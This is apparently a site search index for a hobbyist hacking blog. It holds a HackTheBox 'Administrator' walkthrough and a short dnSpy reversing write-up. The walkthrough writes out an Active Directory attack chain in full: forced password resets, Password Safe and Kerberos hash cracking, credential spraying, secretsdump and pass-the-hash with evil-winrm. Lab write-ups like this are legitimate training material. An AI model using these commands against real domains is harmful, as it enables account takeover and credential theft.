{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Astro's Hacking Forum","text":"<p>Welcome to my hacking forum! A place to dive deep into ethical hacking, red teaming, reversing, forensics, and more. If you're into breaking things to learn \u2014 you're in the right place.</p> <p>Made with love by Astro</p>"},{"location":"forensics/","title":"Forensics","text":""},{"location":"forensics/#easy-forensics-machines","title":"Easy Forensics Machines","text":"<p>View Easy Machines \u279c</p>"},{"location":"reversing/","title":"Reversing","text":""},{"location":"reversing/#easy-reversing-machines","title":"Easy Reversing Machines","text":"<p>View Easy Machines \u279c</p>"},{"location":"walkthroughs/","title":"HackTheBox WriteUps","text":""},{"location":"walkthroughs/#easy-htb-machines","title":"Easy HTB Machines","text":"<p>View Easy Machines \u279c</p>"},{"location":"walkthroughs/#medium-htb-machines","title":"Medium HTB Machines","text":"<p>View Medium Machines \u279c</p>"},{"location":"walkthroughs/#hard-htb-machines","title":"Hard HTB Machines","text":"<p>View Hard Machines \u279c</p>"},{"location":"walkthroughs/#insane-htb-machines","title":"Insane HTB Machines","text":"<p>View Insane Machines \u279c</p>"},{"location":"forensics/easy/easy_machines/","title":"Easy machines","text":"<p>WebStrike - Network Forensics \u279c</p>"},{"location":"htb/medium/Administrator/","title":"Administrator HTB Writeup","text":""},{"location":"htb/medium/Administrator/#machine-information","title":"Machine Information","text":"<p>As is common in real life Windows pentests, you start the Administrator box with credentials: Username: Olivia Password: ichliebedich  </p>"},{"location":"htb/medium/Administrator/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"htb/medium/Administrator/#bloodhound-setup","title":"BloodHound Setup","text":"<p>First of all I used the following command to collect data with Olivia's credentials:</p> <pre><code>bloodhound-python -u 'Olivia' -p 'ichliebedich' -d administrator.htb -c All --zip -ns 10.10.11.42\n</code></pre> <p></p>"},{"location":"htb/medium/Administrator/#3-privilege-escalation-password-abuse","title":"3. Privilege Escalation / Password Abuse","text":"<p>If we check BloodHound, we need to mark Olivia as Owned. Once done that we can go to OutBound Object Control and see the following:</p> <p></p> <p>Here we can see that from user Olivia we have GenericAll to Michael</p> <p></p> <p>To abuse that I runned the following command:</p>"},{"location":"htb/medium/Administrator/#method-1-using-net-rpc","title":"Method 1: Using net rpc","text":"<p>The net rpc password command can be used to change the password of another user via SMB RPC.</p> <pre><code>net rpc password \"michael\" \"newP@ssword2022\" -U \"ADMINISTRATOR.HTB\"/\"Olivia\"%\"ichliebedich\" -S \"10.10.11.42\"\n</code></pre>"},{"location":"htb/medium/Administrator/#method-2-using-bloodyad","title":"Method 2: Using BloodyAD","text":"<p>bloodyAD allows direct LDAP interaction to change user passwords with proper authentication.</p> <pre><code>bloodyAD -d ADMINISTRATOR.HTB -u Olivia -p ichliebedich --host 10.10.11.42 set password michael newP@ssword2022\n</code></pre> <p></p> <p>Lets go back to BloodHound and click on Michael user as Owned, lets click and see lets go to Outbound Object Control as Michael user.</p> <p></p> <p>This output will retrieve that user Michael can ForceChangePassword to Benjamin user.</p> <p></p> <p>To abuse it we can run again these commands:</p>"},{"location":"htb/medium/Administrator/#method-1-using-net-rpc_1","title":"Method 1: Using net rpc","text":"<pre><code>net rpc password \"benjamin\" \"newP@ssword2022\" -U \"ADMINISTRATOR.HTB\"/\"michael\"%\"newP@ssword2022\" -S \"10.10.11.42\"\n</code></pre>"},{"location":"htb/medium/Administrator/#method-2-using-bloodyad_1","title":"Method 2: Using BloodyAD","text":"<pre><code>bloodyAD -d ADMINISTRATOR.HTB -u michael -p newP@ssword2022 --host 10.10.11.42 set password benjamin newP@ssword2022\n</code></pre>"},{"location":"htb/medium/Administrator/#4-accessing-ftp-and-psafe3-file","title":"4. Accessing FTP and <code>.psafe3</code> File","text":"<p>Once we changed that credentials we can abuse them for login via FTP.</p> <p></p> <p>Here we can find a Backup.psafe3 file.</p> <p></p> <p>This file is a Password Safe database, requiring a master password to open.</p> <p>If we try open it it asks for a password so lets get this hash password.</p> <p></p> <p>To extract the hash for cracking, I used:</p> <p></p> <p>Now lets crack the hash.</p> <p></p> <p>Here are the commands I used:</p> <pre><code>pwsafe2john Backup.psafe3 &gt; psafehash\njohn psafehash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n</code></pre> <p>Again lets run PasswordSafe and put the password.</p> <p></p>"},{"location":"htb/medium/Administrator/#5-extracting-and-verifying-credentials","title":"5. Extracting and Verifying Credentials","text":"<p>And we open the \"Vault\".</p> <p></p> <p>Inside Password Safe, I found 3 users. I exported usernames to users.txt and passwords to passwords.txt.</p> <p></p> <p>Then I verified with nxc which user and password is valid.</p> <pre><code>nxc smb 10.10.11.42 -u users.txt -p passwords.txt \n</code></pre> <p></p>"},{"location":"htb/medium/Administrator/#6-further-enumeration-kerberoasting","title":"6. Further Enumeration &amp; Kerberoasting","text":"<p>Lets go back to BloodHound and filter by user Emily and mark it as Owned once again we can retrieve the Outbound Object Control.</p> <p></p> <p>BloodHound showed Emily has GenericWrite to Ethan.</p> <p>For abuse this privilege we can simply run targetedKerberoast If anyone is missing targetedKerberoast here is the repository: targetedKerberoast</p> <p></p> <p>And we have Ethan hash, so lets crack it.</p> <p>Save the content into hash.txt</p> <pre><code>hashcat -a 0 -m 13100 ethanhash.txt /usr/share/wordlists/rockyou.txt -O\n</code></pre> <p>Ethan:limpbizkit</p>"},{"location":"htb/medium/Administrator/#7-final-access-and-root","title":"7. Final Access and Root","text":"<p>Now lets go back to BloodHound again and lets mark as Owned Ethan and lets retrieve its privileges by going to Outbound Object Control.</p> <p></p> <p>And we get the following output.</p> <p></p> <p>As Ethan user we can simply run impacket-secretsdump to retrieve all hashes.</p> <p></p> <p>Here we retrieve the Administrator hash so we can go to evil-winrm and do pass-the-hash</p> <pre><code>evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e\n\ntype C:\\Users\\Emily\\Desktop\\user.txt\n\ntype C:\\Users\\Administrator\\Desktop\\root.txt\n</code></pre> <p>Congratulations you solved the machine. </p> <p>Made by Astro</p>"},{"location":"htb/medium/medium_machines/","title":"Medium machines","text":"<p>Administrator - Active Directory \u279c</p>"},{"location":"reversing/easy/Bypass/","title":"Bypass","text":""},{"location":"reversing/easy/Bypass/#challenge-description","title":"CHALLENGE DESCRIPTION","text":"<p>The Client is in full control. Bypass the authentication and read the key to get the Flag.</p> <p>For this challenge, I used Windows 11 and the program I used was dnSpy (32-bit).</p> <p>First, I analyzed the code until I found the following fragment:</p> <p></p> <p>Since the flags are using boolean values, we can set a breakpoint at this part and debug the code.</p> <p></p> <p>When the program opens, it asks for a username and a password.</p> <p></p> <p>We don\u2019t know these values, but after pressing Enter (after entering the password), we can see the values in dnSpy.</p> <p> What we need to do is set these values to <code>true</code>.</p> <p></p> <p>Next, we need to analyze the code further. I found another boolean flag; here we should place a breakpoint at the conditional check. This prevents the program from continuing before it validates the value.</p> <p></p> <p>Continue running the program, and it will now ask for a secret key.</p> <p></p> <p>If we enter a random value:</p> <p></p> <p>We can see the actual value of the secret key in dnSpy, or we can simply set the corresponding flag to <code>true</code>.</p> <p></p> <p>In this case, I set it to <code>true</code>. </p> <p>Once we continue the program, we get the flag, because we set the required value to <code>true</code>.</p> <p></p> <p>We can also get the actual value from the secret key and it will retrieve the flag too.</p> <p>Made by Astro</p>"},{"location":"reversing/easy/easy_machines/","title":"Easy machines","text":"<p>Bypass - Easy \u279c</p>"}]}